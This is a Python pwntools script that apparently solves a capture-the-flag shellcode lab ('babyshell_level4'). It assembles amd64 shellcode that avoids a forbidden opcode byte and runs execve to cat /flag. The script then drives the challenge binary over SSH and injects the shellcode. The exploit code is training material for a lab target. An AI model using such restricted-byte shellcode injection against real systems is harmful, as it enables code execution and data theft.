#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'

shellcode=f"""
push {u32(b"/cat")}                        /* Push "tac/" onto the stack (32bit/4byte) */
push {u32(b"/usr")}                        /* Push rsu/ onto the stack (32bit/4byte) */
mov dword ptr [rsp+4], {u32(b"/bin")}      /* moves nib/ to the remaining 4 bytes of the previous stackframe' */
push rsp                                   /* push content of rsp (/usr/bin/cat) on the stack */
pop rdi                                    /* pop it from the stack to rdi, if we would not have the opcode restriction we could have used mov, rdi is the first argument */
push {u32(b"/fla")}                        /* Push alf/ onto the stack (32bit/4byte) */
mov dword ptr [rsp+4], {u8(b"g")}          /* moves "g" to the remaining 4 bytes of the previous stackframe' */
push rsp                                   /* same mov circumvention trick */
pop rsi                                    /* ^^ */
push 0                                     /* Null byte to terminate string */
push rsi                                   /* push 2nd arg on the stack */
push rdi                                   /* push 1st arg on the stack */
push rsp                                   /* ? */
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
"""
# both not working, how to prevent 48 opcode in 64 bit mode? 
#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
#shellcode=pwnlib.shellcraft.amd64.linux.sh()
shellcode=(asm(shellcode))


print('1', disasm(shellcode))
#ELF.from_bytes(shellcode).debug().interactive()


def btos(n):
    return n.decode('UTF-8')
    
s = ssh(host="pwn")
f = SSHPath('/tmp/my_script.py', ssh=s)
f.touch()
f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level4")')
p = s.process(['python', '/tmp/my_script.py'])
r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
print(r.decode())


shellcode=bytes(shellcode)
p.send(shellcode)
print(p.recvall().decode("UTF-8"))